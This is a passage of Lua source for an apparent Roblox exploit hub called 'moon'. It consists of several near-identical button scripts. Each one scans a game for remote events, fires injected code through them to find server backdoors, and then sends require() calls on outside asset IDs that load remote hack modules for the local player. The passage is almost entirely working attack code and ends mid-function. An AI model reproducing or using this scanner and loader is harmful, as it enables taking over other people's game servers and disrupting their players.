		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(7634392335)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_42);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_4c()
	local script = G2L["4c"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(5115249013).fehack(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_4c);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_56()
	local script = G2L["56"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(14572394952)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_56);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_60()
	local script = G2L["60"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(3436957371):r6(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_60);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_6a()
	local script = G2L["6a"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(0x1767bf813)(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or  ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_6a);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_74()
	local script = G2L["74"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(4869378421).F3X(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_74);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_7e()
	local script = G2L["7e"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
		local payloading = [[require(6056559552).load(']] .. player.Name .. [[')]]
		pcall(function()
			if isFunction then
				task.spawn(function()
					pcall(function() remote:InvokeServer(payload) end)
					pcall(function() remote:InvokeServer("moonTSS", payload) end)
					pcall(function() remote:InvokeServer(payloading) end)
				end)
			else
				pcall(function() remote:FireServer(payload) end)
				pcall(function() remote:FireServer("moonTSS", payload) end)
				pcall(function() remote:FireServer(payloading) end)
			end
		end)


		return testId
	end

	local function simpleFindRemote()
		foundExploit = false
		remoteEvent, remoteFunction = nil, nil
		timeToFindExploit = 0

		local candidates = {}
		local initialScanStart = os.clock()

		for _, obj in ipairs(game:GetDescendants()) do
			if (obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction")) then
				if isLikelyBackdoorRemote(obj) then
					table.insert(candidates, obj)
				end
			end
		end
		print(string.format("🌙 moon: 🔍 Found %d potential remotes in %.2fms", #candidates, (os.clock() - initialScanStart) * 1000))

		local testStartTime = os.clock()

		local activeTestIds = {}
		if #candidates > 0 then
			for _, remote in ipairs(candidates) do
				if foundExploit then break end
				local testId = testRemote(remote, remote:IsA("RemoteFunction"))
				if testId then
					table.insert(activeTestIds, testId)
				end
			end

			local timeoutDuration = 0.5
			local checkInterval = 0.01
			local elapsed = 0

			while elapsed < timeoutDuration do
				task.wait(checkInterval)
				elapsed += checkInterval

				for i = #activeTestIds, 1, -1 do
					local testId = activeTestIds[i]
					local testData = activeTests[testId]

					if testData and (testData.found or ReplicatedStorage:FindFirstChild(testId)) then
						testData.found = true
						foundExploit = true
						if testData.isFunction then
							remoteFunction = testData.remote
						else
							remoteEvent = testData.remote
						end
						print("🌙 moon: backdoor found:", testData.remote:GetFullName())
						timeToFindExploit = os.clock() - initialScanStart
						activeTests[testId] = nil
						table.remove(activeTestIds, i)
						local f = ReplicatedStorage:FindFirstChild(testId)
						if f then f:Destroy() end
						break
					end
				end
				if foundExploit then break end
			end
		end

		scanTime = os.clock() - initialScanStart
		if not foundExploit then
			print("🌙 moon: no backdoor found")
		else
			print("🔓 Backdoor remote located!")
		end

		for testId, testData in pairs(activeTests) do
			local f = ReplicatedStorage:FindFirstChild(testId)
			if f then f:Destroy() end
			activeTests[testId] = nil
		end
	end
	if script.Parent:IsA("TextButton") or script.Parent:IsA("ImageButton") then
		script.Parent.MouseButton1Click:Connect(function()
			task.spawn(simpleFindRemote)
		end)
	else

		print("🌙 moon: Running initial backdoor scan...")
		task.spawn(simpleFindRemote)
	end
end;
task.spawn(C_7e);
-- StarterGui.ScreenGui.Hub.ScrollingFrame.Just.TextButton.LocalScript
local function C_88()
	local script = G2L["88"];
	local SAFE_LOCATIONS = {
		CoreGui = true,
		ServerStorage = true,
		ReplicatedFirst = true,
		ServerScriptService = true,
	}

	local EXCLUDED_REMOTES = {
		DefaultChatSystemChatEvents = true,
		ChatSystemRunner = true,
		ReplicatedStats = true,
		CharacterStats = true,
		PlayerList = true,
		Badges = true,
		Leaderboard = true,
		Teams = true,
	}

	local foundExploit = false
	local remoteEvent, remoteFunction
	local scanTime = 0
	local timeToFindExploit = 0

	local ReplicatedStorage = game:GetService("ReplicatedStorage")
	local StarterGui = game:GetService("StarterGui")

	local function isLikelyBackdoorRemote(remote)
		if SAFE_LOCATIONS[remote.Parent.ClassName] then return false end
		if string.match(remote:GetFullName(), "^RobloxReplicatedStorage") then
			return false
		end

		if EXCLUDED_REMOTES[remote.Name] then return false end

		return true
	end

	local activeTests = {}
	local function setupGlobalDescendantListener()
		ReplicatedStorage.DescendantAdded:Connect(function(inst)
			if inst:IsA("Folder") and inst.Name:sub(1, 5) == "moon_" then
				local testId = inst.Name
				if activeTests[testId] then
					activeTests[testId].found = true
				end
			end
		end)
	end
	setupGlobalDescendantListener()

	local function testRemote(remote, isFunction)

		if foundExploit then return false end

		local testId = "moon_" .. tostring(os.clock()):gsub("[^%d]", "")
		local payload = string.format([[
			local m = Instance.new("Folder")
			m.Name = "%s"
			m.Parent = game:GetService("ReplicatedStorage")
		]], testId)

		activeTests[testId] = {
			remote = remote,
			isFunction = isFunction,
			found = false
		}

		local player = game.Players.LocalPlayer
